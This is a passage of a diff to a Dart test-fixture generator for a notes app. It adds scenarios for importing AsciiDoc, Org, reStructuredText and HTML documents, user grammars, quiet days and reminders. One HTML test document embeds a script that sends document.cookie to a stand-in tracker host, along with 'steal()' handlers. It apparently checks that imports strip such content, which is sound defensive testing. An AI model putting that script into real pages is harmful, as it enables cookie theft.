@@ -21,8 +21,10 @@
 /// back (`shopping.json`); the History scenario each Routine's history at
 /// held moments with this Device's settings (`history.json`); the Not
 /// today scenario what is skipped and moved, the Agenda, the alarms, the
-/// Missed Summary and the histories at held moments (`not_today.json`).
-/// A scenario with photos and voice recordings writes their bytes as the
+/// Missed Summary and the histories at held moments (`not_today.json`);
+/// the quiet day scenario the quiet days read and at held moments the
+/// alarms, Heads-ups, Nudge, Missed Summary and histories
+/// (`quiet_day.json`). A scenario with photos and voice recordings writes their bytes as the
 /// store keeps them, under `photos/<hash>` and `audio/<hash>`. Next to
 /// them: the store's schema, a signed entry with awkward text, the
 /// question-mark scatter, RRULEs with their Occurrences and the
@@ -200,6 +202,24 @@ final _scenarios = <Scenario>[
         imports.folder('From Notes', folder),
         imports.folder('From Notes', [folder[8], folder[9]]),
         imports.folder('From Notes', [folder[1]]),
+      ];
+    },
+  ),
+  (
+    name: 'import-formats',
+    about:
+        'An Import of documents of other tools (#348, ADR 0036): AsciiDoc, '
+        'Org, reStructuredText and HTML, each with parts the Markdown subset '
+        'has and parts it lacks, kept as written, an include, a script, a '
+        'style and an image among them; a page whose title is its file\'s '
+        'name; extensions in capitals and of every kind; a Markdown file '
+        'beside them and a file of another kind, skipped.',
+    build: (store) {
+      _imported = [
+        Imports(store).folder('From Documents', [
+          for (final (name, at, text) in _documents)
+            ImportFile(name, at, _bytesOf(text)),
+        ]),
       ];
     },
   ),
@@ -596,6 +616,73 @@ final _scenarios = <Scenario>[
     },
   ),
   (
+    name: 'added-grammars',
+    about:
+        'The person\'s own grammars (obf-1037): one added, and again, which '
+        'writes nothing; a file refused, which writes nothing; one of the '
+        'scope of a built-in one, replacing it in its place; a newer file '
+        'of a scope added before; two more whose scopes sort by UTF-16 code '
+        'units; texts no app writes, one that does not read and one kept '
+        'under another scope; one removed, and again, which writes nothing; '
+        'the built-in one back by Remove. `added_grammars.json` holds what '
+        'each length of the log reads as.',
+    build: (store) {
+      void read() {
+        final grammars = store.grammars;
+        _addedGrammarReads.add({
+          'entries': store.allEntries().length,
+          'all': [for (final g in grammars.all) g.scope],
+          'added': [for (final g in grammars.added) g.name],
+          'fences': [
+            for (final name in ['cbl', 'rs', 'rust', 'zz'])
+              grammars.forFence(name)?.scope,
+          ],
+        });
+      }
+
+      String grammar(String name, String scope) =>
+          'name: $name\nscope: $scope\nfile_extensions: [cbl, rs]\n'
+          'contexts:\n  main:\n    - match: \'\\bMOVE\\b\'\n'
+          '      scope: keyword\n';
+      void add(String source) => store.addGrammar(utf8.encode(source));
+      read();
+      add(grammar('COBOL', 'source.cobol'));
+      read();
+      add(grammar('COBOL', 'source.cobol'));
+      read();
+      try {
+        add('name: X\nscope: source.x\ncontexts:\n  main:\n    - match: a++\n');
+      } on GrammarRefused {
+        // Nothing written.
+      }
+      read();
+      add(grammar('My Rust', 'source.rust'));
+      read();
+      add(grammar('COBOL 85', 'source.cobol'));
+      read();
+      add(grammar('Ä', 'source.ä'));
+      add(grammar('ZZ', 'source.😀'));
+      read();
+      store.append(
+        PersonSettingKeys.entity,
+        PersonSettingKeys.grammar('source.broken'),
+        'name: [x\n',
+      );
+      store.append(
+        PersonSettingKeys.entity,
+        PersonSettingKeys.grammar('source.go'),
+        grammar('Not Go', 'source.notgo'),
+      );
+      read();
+      store.removeGrammar('source.cobol');
+      read();
+      store.removeGrammar('source.cobol');
+      read();
+      store.removeGrammar('source.rust');
+      read();
+    },
+  ),
+  (
     name: 'hidden-from-ai',
     about:
         'Hidden from AI (#267): a Note in a Topic of an Area and its Amend, '
@@ -690,14 +777,15 @@ final _scenarios = <Scenario>[
   (
     name: 'help',
     about:
-        'The help Notes (#180, ADR 0042): a fresh install makes Quick start, '
-        'a Checklist, and What the icons mean with its picture in the Area '
-        '"Old Brain Fix", and no What\'s new; the same start again makes '
-        'nothing; Quick start deleted; an update to 0.4.1 in German makes '
-        'its What\'s new only; with no version recorded, an update makes '
-        'the What\'s new of 0.4.0 in English and nothing deleted again; the '
-        'Area deleted, an update to 0.5.0 makes it again with its What\'s '
-        'new. `help.json` holds the ids each step made.',
+        'The help Notes (#180, ADR 0042, ADR 0055): a fresh install makes '
+        'nothing, neither Quick start nor What the icons mean nor a What\'s '
+        'new, and records its version; the same start again makes nothing; '
+        'an update to 0.4.1 in German makes its What\'s new only, in the '
+        'Area "Old Brain Fix"; that What\'s new deleted, with no version '
+        'recorded, an update makes the What\'s new of 0.4.0 in English and '
+        'nothing deleted again; the Area deleted, an update to 0.5.0 makes '
+        'it again with its What\'s new. `help.json` holds the ids each step '
+        'made.',
     build: (store) {
       store.applyProfileDefaults(name: 'Ada');
       final help = HelpNotes(store);
@@ -714,8 +802,8 @@ final _scenarios = <Scenario>[
       make('0.4.0', fresh: true);
       make('0.4.0', fresh: true);
       final person = store.ownProfile!.id;
-      Notes(store).trash(HelpNotes.quickStartId(person));
       make('0.4.1', fresh: false, lang: 'de');
+      Notes(store).trash(HelpNotes.whatsNewId(person, '0.4.1'));
       store.removeLocalSetting(HelpNotes.versionSetting);
       make('0.4.1', fresh: false);
       Places(store).deleteArea(HelpNotes.areaId(person), NotesGo.trash);
@@ -892,6 +980,75 @@ final _scenarios = <Scenario>[
     },
   ),
   (
+    name: 'quiet-day',
+    about:
+        'Quiet days (obf-1044): a Routine twice a day, a weekly one '
+        'Re-nagging into a quiet day, an all-day one, a Reminder with '
+        'Heads-ups and an Unsorted Note; one day made quiet until '
+        'midnight, a later one made quiet and ended in the afternoon; and '
+        'quiet days under keys and with values no app writes.',
+    build: (store) {
+      final routines = Routines(store);
+      void jump(Duration by) => _tick = _tick.add(by);
+      routines.create(
+        'Take the pills',
+        Schedule(
+          start: Day(2026, 1, 1),
+          times: [_at(8), _at(20)],
+          rule: Recurrence.parse('FREQ=DAILY'),
+        ),
+      );
+      routines.create(
+        'Stretch',
+        Schedule(
+          start: Day(2026, 1, 5),
+          times: [_at(9)],
+          rule: Recurrence.parse('FREQ=WEEKLY;BYDAY=MO'),
+        ),
+      );
+      routines.create(
+        'Walk',
+        Schedule(
+          start: Day(2026, 1, 1),
+          times: const [],
+          rule: Recurrence.parse('FREQ=DAILY'),
+        ),
+      );
+      final dentist = routines.create(
+        'Dentist',
+        Schedule(start: Day(2026, 1, 7), times: [_at(10)]),
+      );
+      routines.setHeadsUps(dentist.id, [60, 1440]);
+      Notes(store).capture('Call Grandma back');
+      // Tuesday the 6th, 13:00: quiet until midnight.
+      jump(const Duration(days: 5, hours: 2));
+      store.quietToday(_europe);
+      store.quietToday(_europe);
+      // Thursday the 8th, 08:00: quiet, and ended at 14:00.
+      jump(const Duration(hours: 43));
+      store.quietToday(_europe);
+      jump(const Duration(hours: 6));
+      store.endQuietDay(_europe);
+      store.endQuietDay(_europe);
+      // As no app writes them.
+      store.append(
+        PersonSettingKeys.entity,
+        '${PersonSettingKeys.quietDayPrefix}2026-1-9',
+        PersonSettingKeys.on,
+      );
+      store.append(
+        PersonSettingKeys.entity,
+        PersonSettingKeys.quietDay(Day(2026, 1, 10)),
+        'Rude',
+      );
+      store.append(
+        PersonSettingKeys.entity,
+        PersonSettingKeys.quietDay(Day(2026, 1, 11)),
+        '2026-01-11T12:00:00.000Z later',
+      );
+    },
+  ),
+  (
     name: 'media',
     about:
         'Photos and voice recordings: Notes captured with photos, '
@@ -988,7 +1145,9 @@ final _scenarios = <Scenario>[
         'at a given time and unchecked; a Routine trashed, another trashed '
         'and restored; Notes trashed with their Routines and restored, '
         'trashed without them, and trashed with them for good; Unsorted '
-        'Notes for the Nudge.',
+        'Notes for the Nudge; Heads-ups, timed, all-day with an offset of '
+        'no whole days, a day back across the switch to summer time, of a '
+        'Reminder Done ahead, and as a modified app might write them.',
     build: (store) {
       final notes = Notes(store);
       final routines = Routines(store);
@@ -1021,7 +1180,7 @@ final _scenarios = <Scenario>[
       final weekend = routines.spawn(plants.id, weekends);
       routines.reschedule(weekend.id, weekends);
       final dentist = notes.capture('Dentist');
-      routines.spawn(
+      final skippedHour = routines.spawn(
         dentist.id,
         Schedule(start: Day(2026, 3, 29), times: [_at(2, 30)]),
       );
@@ -1102,6 +1261,31 @@ final _scenarios = <Scenario>[
       routines.trashNote(car.id);
       notes.capture('Unsorted thought', nudgeIn: const Duration(minutes: 10));
       notes.capture('Another thought');
+      // Heads-ups (obf-1046): the medication's, one snoozed in a check;
+      // the weekends' in whole days only; the Reminder's on the hour the
+      // clock skips; a day back across the switch to summer time; those
+      // of a Reminder Done ahead; and as a modified app might write them.
+      // The new Reminders lie in spring, away from the autumn days the
+      // desktop's tests ring this log on.
+      routines.setHeadsUps(medication.id, [1440, 20]);
+      routines.setHeadsUps(weekend.id, [30, 1440, 2880]);
+      routines.setHeadsUps(skippedHour.id, [20, 60]);
+      final train = routines.create(
+        'Night train',
+        Schedule(start: Day(2026, 3, 29), times: [_at(23)]),
+      );
+      routines.setHeadsUps(train.id, [1440]);
+      final haircut = routines.create(
+        'Haircut',
+        Schedule(start: Day(2026, 4, 2), times: [_at(9)]),
+      );
+      routines.setHeadsUps(haircut.id, [2880, 1440]);
+      routines.markDone(haircut.id, Occurrence(Day(2026, 4, 2), _at(9)));
+      store.append(
+        HeadsUpKeys.of(night.id),
+        HeadsUpKeys.headsUps,
+        '0020,abc,15,+5, 5,43201,1440,15,-3,',
+      );
     },
   ),
   (
@@ -4408,6 +4592,130 @@ Map<String, Object?> _notToday(Store store) {
   return result;
 }
 
+/// What the `quiet-day` scenario comes to (obf-1044): the quiet days
+/// read, and at held moments the stretch now lies in, the Agenda, the
+/// alarm plan, the Heads-ups, the Nudge, the Missed Summary, what each
+/// Note asks to check off, what the notifications may close and each
+/// Routine's history, on [_europe]. Leaves the clock held as it was.
+Map<String, Object?> _quietDay(Store store) {
+  final routines = Routines(store);
+  String? iso(DateTime? at) => at?.toUtc().toIso8601String();
+  Map<String, Object?> adherence(Adherence a) => {
+    'done': a.done,
+    'missed': a.missed,
+    'skipped': a.skipped,
+    'share': a.share,
+  };
+  List<Object?> rows(List<AgendaRow> rows) => [
+    for (final row in rows)
+      [row.routine.id, row.occurrence.key, iso(row.done), iso(row.skipped)],
+  ];
+  final held = _held;
+  final checks = [
+    // Tuesday 09:00, quiet all day: nothing rings, the Monday Stretch
+    // waits for midnight.
+    DateTime.utc(2026, 1, 6, 8),
+    // Wednesday 09:00: Tuesday's leftovers are skipped.
+    DateTime.utc(2026, 1, 7, 8),
+    // Thursday 11:00, quiet until 14:00.
+    DateTime.utc(2026, 1, 8, 10),
+    // Thursday 15:00, after End: what is still to come rings.
+    DateTime.utc(2026, 1, 8, 14),
+    // The Monday after: both quiet days in the histories.
+    DateTime.utc(2026, 1, 12, 11),
+  ];
+  final days = store.quietDays.ends;
+  final result = {
+    'quietDays': {
+      for (final day in days.keys.toList()..sort()) '$day': iso(days[day]),
+    },
+    'checks': [
+      for (final now in checks)
+        () {
+          _held = now;
+          final alarms = Alarms(store);
+          final agenda = routines.agenda(_europe);
+          final nudge = alarms.nudge(_europe);
+          final missed = alarms.missed(_europe);
+          return {
+            'now': now.toIso8601String(),
+            'quietUntil': iso(store.quietUntil(_europe)),
+            'agenda': {
+              'today': rows(agenda.todayRows),
+              'tomorrow': rows(agenda.tomorrowRows),
+            },
+            'alarms': [
+              for (final a in alarms.plan(_europe))
+                [
+                  a.id,
+                  iso(a.at),
+                  a.wall == null ? null : _wall(a.wall!),
+                  iso(a.endsAt),
+                  iso(a.firesAfter(now)),
+                  iso(a.escalatesAt),
+                ],
+            ],
+            'headsUps': [
+              for (final h in alarms.headsUps(_europe)) [h.id, iso(h.at)],
+            ],
+            'nudge': nudge == null
+                ? null
+                : {
+                    'at': iso(nudge.at),
+                    'since': iso(nudge.since),
+                    'own': [for (final a in nudge.anchors) iso(a.due)],
+                  },
+            'missed': {
+              'count': missed.count,
+              'nextChange': iso(missed.nextChange),
+              'routines': [
+                for (final m in missed.routines)
+                  [
+                    m.routine.id,
+                    for (final o in m.missed)
+                      [o.occurrence.key, iso(o.missedAt)],
+                  ],
+              ],
+            },
+            'openOf': {
+              for (final note in Notes(store).all())
+                note.id: [
+                  for (final o in alarms.openOf(note.id, _europe))
+                    [o.routine.id, o.occurrence.key, o.missed],
+                ],
+            },
+            'recentlyDone': [
+              for (final (id, o) in alarms.recentlyDone(_europe)) [id, o.key],
+            ],
+            'histories': [
+              for (final r in routines.all())
+                () {
+                  final h = routines.history(r, _europe);
+                  return {
+                    'routine': r.id,
+                    'thisWeek': adherence(h.thisWeek),
+                    'thisMonth': adherence(h.thisMonth),
+                    'entries': [
+                      for (final e in h.entries)
+                        [
+                          e.occurrence.key,
+                          e.status.name,
+                          iso(e.missedAt),
+                          iso(e.doneAt),
+                          iso(e.skippedAt),
+                        ],
+                    ],
+                  };
+                }(),
+            ],
+          };
+        }(),
+    ],
+  };
+  _held = held;
+  return result;
+}
+
 /// How many alarms of each plan the fixture spells out, the soonest
 /// first; the count covers them all.
 const _alarmsShown = 40;
@@ -4522,6 +4830,8 @@ Map<String, Object?> _alarms(Store store) {
     ],
     'all': [for (final r in routines.all()) r.id],
     'trashed': [for (final r in routines.trashed()) r.id],
+    // Each person's own Heads-ups, as read (obf-1046).
+    'headsUpsOf': {for (final id in ids) id: routines.headsUps(id)},
     'ofNote': {
       for (final note in Notes(store).all())
         note.id: [for (final r in routines.ofNote(note.id)) r.id],
@@ -4538,6 +4848,7 @@ Map<String, Object?> _alarms(Store store) {
           final plan = alarms.plan(_europe);
           final missed = alarms.missed(_europe);
           final nudge = alarms.nudge(_europe);
+          final headsUps = alarms.headsUps(_europe);
           final later = now.add(const Duration(hours: 3));
           return {
             'now': now.toIso8601String(),
@@ -4565,6 +4876,30 @@ Map<String, Object?> _alarms(Store store) {
                   'text': a.text,
                   'wordless': a.wordless.name,
                   'firesAfterNow': a.firesAfter(now)?.toUtc().toIso8601String(),
+                  // Quiet Hours silence it unless it escalates (obf-1045).
+                  'quiet': a.quiet?.toString(),
+                  'silentAfterNow': switch (a.firesAfter(now)) {
+                    final fires? => a.silentAt(fires, _europe),
+                    null => null,
+                  },
+                },
+            ],
+            // Heads-ups before the Occurrences (obf-1046).
+            'headsUpCount': headsUps.length,
+            'headsUps': [
+              for (final h in headsUps.take(_alarmsShown))
+                {
+                  'id': h.id,
+                  'routine': h.routineId,
+                  'occurrence': h.occurrence.key,
+                  'minutes': h.minutes,
+                  'at': h.at.toUtc().toIso8601String(),
+                  'wall': _wall(h.wall),
+                  'start': _wall(h.start),
+                  'text': h.text,
+                  'wordless': h.wordless.name,
+                  'quiet': h.quiet?.toString(),
+                  'silent': h.silentAt(_europe),
                 },
             ],
             'missed': {
@@ -5158,6 +5493,9 @@ final _featureReads = <Map<String, Object>>[];
 /// What the `area-order` scenario read after each of its steps.
 final _areaOrderReads = <Map<String, Object>>[];
 
+/// What the `added-grammars` scenario read after each of its steps.
+final _addedGrammarReads = <Map<String, Object>>[];
+
 /// What the `hidden-from-ai` scenario read after each of its steps.
 final _hiddenFromAiReads = <Map<String, Object>>[];
 
@@ -5175,35 +5513,10 @@ final _helpMade = <List<String>>[];
 /// write them.
 final _helpEnglish = HelpTexts(
   areaName: 'Old Brain Fix',
-  quickStartTitle: 'Quick start',
-  quickStartLines: const ['Capture a thought with +', 'File it into an Area'],
-  quickStartDescription:
-      'Go there:\n1. [Agenda](oldbrainfix://agenda)\n\n'
-      'On the desktop:\nCapture: Ctrl+N',
-  iconsText:
-      'What the icons mean\n\nKind: what the Note is\n\n'
-      '[User guide](oldbrainfix://guide)',
-  iconPictures: [
-    Uint8List.fromList([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 1]),
-  ],
   whatsNewTitle: (v) => "What's new in $v",
 );
 final _helpGerman = HelpTexts(
   areaName: 'Old Brain Fix',
-  quickStartTitle: 'Schnellstart',
-  quickStartLines: const [
-    'Einen Gedanken mit + erfassen',
-    'Ihn in einen Bereich einsortieren',
-  ],
-  quickStartDescription:
-      'Hingehen:\n1. [Agenda](oldbrainfix://agenda)\n\n'
-      'Auf dem Desktop:\nErfassen: Strg+N',
-  iconsText:
-      'Was die Symbole bedeuten\n\nArt: was die Notiz ist\n\n'
-      '[Anleitung](oldbrainfix://guide)',
-  iconPictures: [
-    Uint8List.fromList([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 2]),
-  ],
   whatsNewTitle: (v) => 'Neu in $v',
 );
 const _helpBundle = {
@@ -5301,6 +5614,187 @@ const _keepPng = [
   0x0a, 0x49, 0x44, 0x41, 0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00, //
   0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00, 0x00, 0x00, 0x00, 0x49, //
   0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82, //
+];
+
+/// The documents the `import-formats` scenario imports, as an app hands
+/// them over: each its name, when it was last changed and its text.
+final _documents = <(String, DateTime?, String)>[
+  (
+    'Garden notes.adoc',
+    DateTime.utc(2025, 4, 2, 7, 15),
+    '= Garden notes\n'
+        ':author: Ada\n'
+        '\n'
+        '== Planting\n'
+        'Plant *tomatoes* and _basil_ in `bed 2`, see '
+        'https://example.org/garden_plan[the plan^].\n'
+        'Water **every**morning +\n'
+        'and [.line-through]#never# at noon, Grüße 😀.\n'
+        '\n'
+        '* Seeds\n'
+        '** Carrots\n'
+        '. First\n'
+        '. Second\n'
+        '\n'
+        '[source,python]\n'
+        '----\n'
+        'print("**not bold**")\n'
+        '----\n'
+        '\n'
+        '____\n'
+        'A quote with *bold*.\n'
+        '____\n'
+        '\n'
+        'include::secret.adoc[]\n'
+        'image::https://example.org/photo.png[A photo]\n'
+        '\n'
+        'NOTE: Keep the hose coiled.\n'
+        '\n'
+        '|===\n'
+        '|Plant |Month\n'
+        '\n'
+        '|Tomato\n'
+        '|May\n'
+        '|Basil |June\n'
+        '|===\n'
+        '\n'
+        '=== Deeper\n'
+        '// a comment\n',
+  ),
+  (
+    'week.org',
+    DateTime.utc(2025, 4, 2, 7, 15),
+    '#+TITLE: Week plan\n'
+        '#+AUTHOR: Ada\n'
+        '* TODO Shopping :errands:\n'
+        '  - milk and *butter*\n'
+        '  - [ ] /fresh/ bread\n'
+        '    - rye\n'
+        '  1. first\n'
+        '  2) second\n'
+        '** Notes\n'
+        'Call =Bob= about the +old+ ~car~, see '
+        '[[https://example.org/a_b][the page]] or [[file:other.org][other]].\n'
+        '*** Deeper heading\n'
+        ':PROPERTIES:\n'
+        ':ID: 1234\n'
+        ':END:\n'
+        '#+BEGIN_SRC shell\n'
+        '  echo "hi"\n'
+        '  ,* not a heading\n'
+        '#+END_SRC\n'
+        '#+begin_quote\n'
+        'Be kind.\n'
+        '#+end_quote\n'
+        '#+INCLUDE: "secret.org"\n'
+        '| Name | Age |\n'
+        '|------+-----|\n'
+        '| Ann  | 3   |\n'
+        '# a comment\n'
+        '_underlined_ line\\\\\n'
+        'https://example.org/x_y is bare.\n',
+  ),
+  (
+    'Recipes.rst',
+    DateTime.utc(2025, 1, 20, 18),
+    '==========\n'
+        'Recipes\n'
+        '==========\n'
+        '\n'
+        'Soup 🍲\n'
+        '======\n'
+        '\n'
+        'Cut **onions** and *carrots*, use ``salt``. See '
+        '`the site <https://example.org/soup>`_ or `Notes`_.\n'
+        '\n'
+        '- one\n'
+        '- two\n'
+        '\n'
+        '  - deep\n'
+        '\n'
+        '#. auto\n'
+        '#. auto again\n'
+        '\n'
+        'Example::\n'
+        '\n'
+        '    print("x")\n'
+        '\n'
+        '.. code-block:: python\n'
+        '   :linenos:\n'
+        '\n'
+        '   def f():\n'
+        '       return 1\n'
+        '\n'
+        '.. include:: secret.rst\n'
+        '.. note:: Keep warm.\n'
+        '\n'
+        'Küche\n'
+        '-----\n'
+        '\n'
+        'Third level\n'
+        '~~~~~~~~~~~\n'
+        '\n'
+        '+------+-----+\n'
+        '| Name | Qty |\n'
+        '+======+=====+\n'
+        '| Egg  | 2   |\n'
+        '+------+-----+\n'
+        '\n'
+        ':Author: Ada\n'
+        'Escaped \\*star\\* and :role:`text`.\n',
+  ),
+  (
+    'Trip.HTML',
+    DateTime.utc(2024, 12, 24, 16, 30),
+    '<!DOCTYPE html>\n'
+        '<html><head><title>Trip &amp; tour</title>'
+        '<style>p { color: red }</style>\n'
+        '<script>fetch("https://tracker.example/?" + document.cookie)</script>'
+        '</head>\n'
+        '<body onload="steal()">\n'
+        '<h1>Trip   <em>north</em></h1>\n'
+        '<p>Pack <b>boots </b>and <a href="https://example.org/?a=1&amp;b=2">'
+        'the map</a>, not <a href="javascript:steal()">this</a>.<br>'
+        'Costs &euro; 12 &copy; &#x1F600; &bogus;</p>\n'
+        '<!-- a comment -->\n'
+        '<ul><li>Socks<ul><li>Wool</li></ul></li><li><p>Hat</p></li></ul>\n'
+        '<ol start="3"><li>Three</li><li>Four</li></ol>\n'
+        '<blockquote><p>Quoted *stars*</p></blockquote>\n'
+        '<pre><code class="language-sh">ls -l\n  cd ~\n</code></pre>\n'
+        '<table><tr><th>Day</th><th>A|B</th></tr>'
+        '<tr><td>1</td><td><code>x|y</code></td></tr></table>\n'
+        '<h3>Small heading</h3>\n'
+        '<img src="https://tracker.example/pixel.png" alt="A fjord">\n'
+        '<div>one</div><div>two <s>gone</s></div>\n'
+        '</body></html>\n',
+  ),
+  ('Packing.htm', null, '<title>Packing</title><p>Socks</p>'),
+  (
+    'Old notes.asciidoc',
+    DateTime.utc(2024, 12, 24, 16, 30),
+    'A line with a #hashtag and *bold*.\n',
+  ),
+  ('key.ASC', DateTime.utc(2024, 3, 1), '-----BEGIN NOTE-----\nplain\n'),
+  ('Plain.md', DateTime.utc(2025, 2, 2), '# Plain\n*kept* as written\n'),
+  ('slides.pdf', DateTime.utc(2025, 2, 2), '%PDF-1.4'),
+];
+
+/// What the cores read each of [_documents] as, in the order handed
+/// over: the title and the Markdown of each document of another tool.
+List<Map<String, Object?>> _documentsRead() => [
+  for (final (name, at, text) in _documents)
+    {
+      'modified': at?.toIso8601String(),
+      'name': name,
+      if (ImportFormats.ofExtension(
+            name.substring(name.lastIndexOf('.') + 1).toLowerCase(),
+          )
+          case final format?)
+        'read': {
+          'text': ImportFormats.read(format, text).text,
+          'title': ImportFormats.read(format, text).title,
+        },
+    },
 ];
 
 /// The folder the `import` scenario imports, as an app hands it over.
@@ -9522,6 +10016,118 @@ Map<String, Object?> _tagTree() {
   }
 }
 
+/// The Notes that link to a Note (obf-1035): the Areas made, the Notes
+/// captured, each with its format, the Area it is filed into by its
+/// index, the one it is merged into and whether it is trashed, then its
+/// Amends once every Note is captured. In a text `{n}` is the app link to
+/// the `n`th Note, `{^n}` the same with its scheme in capitals and `{%n}`
+/// with the `:` of its id %-encoded; a Note's own text links only to
+/// those captured before it. Then for each Note the indexes of the Notes
+/// linking to it, with nothing closed and with the Areas of `closed`
+/// closed.
+Map<String, Object?> _backlinks() {
+  const areas = ['Locked', 'Open'];
+  const shut = ['Locked'];
+  const md = TextFormats.markdown;
+  const captured = [
+    {
+      'text': 'Ann',
+      'amends': [
+        {'text': 'Myself: [Ann]({0})', 'format': md},
+      ],
+    },
+    {'text': 'Call [Ann]({0})', 'format': md},
+    {
+      'text': 'Groceries',
+      'amends': [
+        {'text': '**[Ann]({0})** and [Bea]({3})', 'format': md},
+      ],
+    },
+    {'text': '| Who |\n| --- |\n| [Ann]({^0}) |', 'format': md},
+    {'text': 'Plain [Ann]({0})'},
+    {'text': '[Ann]({0})', 'format': TextFormats.code},
+    {'text': '`[Ann]({0})` and [Ann](https://example.org)', 'format': md},
+    {'text': 'Locked [Ann]({%0})', 'format': md, 'area': 0},
+    {'text': 'Gone [Ann]({0})', 'format': md, 'trashed': true},
+    {'text': 'Household', 'area': 1},
+    {'text': 'Merged [Bea]({3})', 'format': md, 'into': 9},
+    {'text': 'Twice [Ann]({0}) and *[Ann]({0})*', 'format': md, 'area': 1},
+    {'text': 'Into locked [Bea]({3})', 'format': md, 'into': 7},
+  ];
+  var at = DateTime.utc(2026, 11, 12, 8);
+  final store = Store.inMemory(
+    clock: () => at,
+    newKey: () => SigningKey.fromSeed(_seed),
+  );
+  try {
+    final notes = Notes(store);
+    final places = Places(store);
+    final areaIds = [for (final name in areas) places.addArea(name).id];
+    final ids = <String>[];
+    String written(String text) =>
+        text.replaceAllMapped(RegExp(r'\{([\^%]?)(\d+)\}'), (m) {
+          final id = ids[int.parse(m[2]!)];
+          final url = AppLink(AppLinkKind.note, id).url;
+          return switch (m[1]) {
+            '^' => url.replaceFirst(AppLink.scheme, 'OLDBRAINFIX://'),
+            '%' => '${AppLink.scheme}note/${id.replaceAll(':', '%3A')}',
+            _ => url,
+          };
+        });
+    for (final note in captured) {
+      at = at.add(const Duration(minutes: 1));
+      final place = switch (note['area']) {
+        final int i => areaIds[i],
+        _ => null,
+      };
+      ids.add(
+        notes
+            .capture(
+              written(note['text'] as String),
+              format: note['format'] as String? ?? TextFormats.plain,
+              place: place,
+            )
+            .id,
+      );
+    }
+    for (final (i, note) in captured.indexed) {
+      final amends = note['amends'] as List<Map<String, String>>? ?? const [];
+      for (final amend in amends) {
+        at = at.add(const Duration(minutes: 1));
+        notes.amend(
+          ids[i],
+          written(amend['text']!),
+          format: amend['format'] ?? TextFormats.plain,
+        );
+      }
+    }
+    for (final (i, note) in captured.indexed) {
+      if (note['into'] case final int into) notes.merge(ids[i], ids[into]);
+      if (note['trashed'] == true) notes.trash(ids[i]);
+    }
+    final closed = {
+      for (final (i, name) in areas.indexed)
+        if (shut.contains(name)) areaIds[i],
+    };
+    final backlinks = Backlinks(store);
+    List<List<int>> linking(Set<String> closed) => [
+      for (final id in ids)
+        [
+          for (final note in backlinks.to(id, closed: closed))
+            ids.indexOf(note.id),
+        ],
+    ];
+    return {
+      'areas': areas,
+      'closed': {'areas': shut, 'linking': linking(closed)},
+      'linking': linking(const {}),
+      'notes': captured,
+    };
+  } finally {
+    store.close();
+  }
+}
+
 /// Schedules as sentences (ADR 0044), on a held day: each schedule of
 /// the simple editor written in English and German and read back, more
 /// texts read as typed with the parts not understood, and the words
@@ -9892,6 +10498,394 @@ Map<String, Object?> _scheduleSentences() {
           },
     ],
   };
+}
+
+/// Code coloured by its language (obf-1036): the built-in grammars, a
+/// text in each with its coloured parts, grammars made for the corners
+/// of the subset, fence names, guesses and what is refused. Offsets are
+/// code points.
+Map<String, Object?> _highlight() {
+  List<Object> spans(Grammar g, String text) => [
+    for (final s in g.colour(text))
+      [
+        text.substring(0, s.start).runes.length,
+        text.substring(0, s.end).runes.length,
+        s.colour.name,
+      ],
+  ];
+  const samples = <String, String>{
+    'source.shell':
+        '#!/bin/bash\n# greet\nname="wörld \$USER"\nif [ -n "\$1" ]; then\n'
+        '  echo \'hi\' \$((1 + 2)) | grep -c h # 😀\nfi\nfor f in *.txt; do cat "\$f"; done\n',
+    'source.python':
+        '#!/usr/bin/env python3\n"""Doc\nstring."""\nimport os\n\n'
+        '@cache\ndef add(a: int, b=2) -> int:\n    # sum 😀\n'
+        '    return a + b * 0x1F if a else None\n\nclass Foo(Base):\n'
+        '    s = f"x{a}" + r\'\\d\' + \'it\\\'s\'\n',
+    'source.js':
+        'import { a } from "./a.js";\n// note 😀\nconst x = 1_000n, y = 3.5e-2;\n'
+        'export async function f(p) {\n  return `v=\${p + 1}`;\n}\n'
+        'interface Point { x: number; readonly y?: string }\n/* block\n comment */ let z = null;\r\n',
+    'source.rust':
+        '//! Doc\nuse std::fmt;\n\n#[derive(Debug)]\npub struct Point<\'a> { x: i32, s: &\'a str }\n\n'
+        'fn main() {\n    let r = r#"raw "q""#;\n    println!("{} {}", 0xFF_u8, 1.5e3); // 😀\n'
+        '    /* nested? */ if true { return; }\n}\n',
+    'source.dart':
+        'import \'dart:io\';\n\n/// Doc.\nclass A extends B with C {\n'
+        '  final int x = 42;\n  @override\n  String toString() => \'A(\$x, \${x + 1})\';\n}\n'
+        'void main() async {\n  var s = r\'\\n\' + """multi\nline""";\n  print(s ?? null); // 😀\n}\n',
+    'source.kotlin':
+        'package demo\n\nimport kotlin.math.max\n\ndata class P(val x: Int, var y: String?)\n\n'
+        'fun main() {\n    val s = "x=\${max(1, 2)} \$name"\n    when (s) { is String -> println(s) }\n'
+        '    /* c */ val n = 0x1FL // 😀\n}\n',
+    'source.java':
+        'package a.b;\n\nimport java.util.List;\n\n@Deprecated\npublic final class Main {\n'
+        '    private static final int N = 10;\n    public static void main(String[] args) {\n'
+        '        String t = """\n            text block\n            """;\n'
+        '        System.out.println("n=" + N + \'c\'); // 😀\n    }\n}\n',
+    'source.c++':
+        '#include <stdio.h>\n#define N 10\n\n/* block */\nint main(void) {\n'
+        '    const char *s = "a\\tb";\n    for (int i = 0; i < N; ++i) printf("%d\\n", i);\n'
+        '    return 0; // 😀\n}\ntemplate <typename T> class V : public std::vector<T> {};\n',
+    'source.go':
+        'package main\n\nimport "fmt"\n\ntype T struct{ X int }\n\n'
+        'func (t *T) Add(n int) int {\n\treturn t.X + n // 😀\n}\n\n'
+        'func main() {\n\ts := `raw\nstring`\n\tfmt.Println(s, 3.14, true, nil)\n}\n',
+    'source.sql':
+        '-- report 😀\nSELECT id, COUNT(*) AS n\nFROM notes n\nwhere n.text LIKE \'%it\'\'s%\'\n'
+        '  AND n.made > 10\nGROUP BY id;\n/* block\n */ insert into t values (1, NULL);\n',
+    'source.json':
+        '{\n  "name": "Old Brain Fix",\n  "n": -1.5e3,\n  "ok": true,\n'
+        '  "none": null,\n  "list": [1, "two \\u00e9 😀", false]\n}\n',
+    'source.yaml':
